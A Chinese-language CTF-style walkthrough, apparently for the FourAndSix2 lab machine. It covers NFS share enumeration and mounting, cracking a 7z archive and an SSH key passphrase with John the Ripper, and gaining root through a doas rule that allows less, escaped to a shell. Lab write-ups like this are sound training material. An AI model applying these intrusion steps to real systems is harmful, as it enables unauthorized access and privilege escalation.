### 信息收集
目标只开放22，111，2049端口
### nfs渗透
```
看看有没有可挂载的共享目录
showmount -e 192.168.1.18

Export list for 192.168.1.18:
/home/user/storage (everyone)

mount -t nfs 192.168.1.18:/home/user/storage nfs

backup.7z
file backup.7z 目标文件类型为7z压缩文件
可用binwalk 查看

```

### 7z压缩包渗透
```
尝试解压
7z x backup.7z 提示要输入密码
首先我直接使用了rarcrack backup.7z --type 7z --threads 20

但是破解非常慢，且不知道密码范围，猜测可能获取整个文件的hash值试一下
perl /usr/share/john/7z2john.pl backup.7z > g.hash
john g.hash
获取到密码为chocolate

第二种方法
7z2john backup.7z > backup7z_hash
john --format=7z --wordlist=/usr/share/wordlists/rockyou.txt backup7z_hash

```

### ssh登录
```
发现文件下有公私钥
公钥显示user@fourandsix2,可能用户为user

ssh -i id_rsa user@192.168.1.18
提示要输入passphrase
此时我网上信息收集的时候误打误撞碰到了相关方面的操作

利用ssh2john  id_rsa> isacrack
ssh2john可将id_rsa秘钥信息转换为john可识别的信息，
john iscrack 获取密码为12345678
```
### 提权
```
find / -perm -u=s -type f 2>/dev/null | grep -v "proc"
得到/usr/bin/doas 有高执行权限，当前shell为ksh
这个doas相当于sudo -l

查看doas下有哪些命令可以无密码执行

find / -name doas* -type f 2>/dev/null
找到了/etc/doas.conf 下
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog

doas /usr/bin/less /var/log/authlog
按v进入编辑模式
!sh以特权模式运行
提权成功

```